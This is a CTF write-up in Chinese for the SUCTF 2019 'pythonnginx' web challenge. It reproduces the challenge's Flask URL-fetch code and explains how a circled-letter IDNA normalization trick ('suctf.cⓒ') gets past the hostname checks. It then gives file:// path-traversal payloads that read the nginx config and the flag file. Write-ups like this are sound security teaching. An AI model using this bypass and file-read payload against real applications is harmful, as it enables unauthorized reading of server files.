# SUCTF 2019

## Web

### pythonnginx

通过查看源代码可以发现以下内容。

```python
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url") # 设 url=https://xxx.com/index.php
    host = parse.urlparse(url).hostname # xxx.com
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url)) # ['https', 'xxx.com', '/index.php', '', '']
    host = parts[1] # xxx.com
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
    </code>
#    <!-- Dont worry about the suctf.cc. Go on! -->
#    <!-- Do you know the nginx? -->
```

本题需要绕过第一层和第二层的域名判断，并且在经历一次 idna 编码后的第三层中又要符合 host 名为 `suctf.cc` ，idna 的例子如下。

```python
print('ⓒ'.encode('idna').decode('utf-8'))
# c
```

因此可以通过版权符号来绕过第一层和第二层的绕过并且又符合 host 名为 `suctf.cc` 。又因为题目中包含提示 `Do you know the nginx` 故需要从 nginx 的相关文件中来找 flag ，最后可以在 `/usr/local/nginx/conf/nginx.conf` 中找到相关信息，Payload 以及回显如下所示。

```nginx
# url=file://suctf.cⓒ/../../../../../../../../usr/local/nginx/conf/nginx.conf

server { 
    listen 80; 
    location / { 
        try_files $uri @app; 
    } 
    location @app { 
        include uwsgi_params; 
        uwsgi_pass unix:///tmp/uwsgi.sock; 
    } 
    location /static {
        alias /app/static; 
    } 
    # location /flag { 
    #     alias /usr/fffffflag; 
    # } 
}
```

通过构造以下 Payload 即可得到 flag 。

```
url=file://suctf.cⓒ/../../../../../../../../usr/fffffflag
```
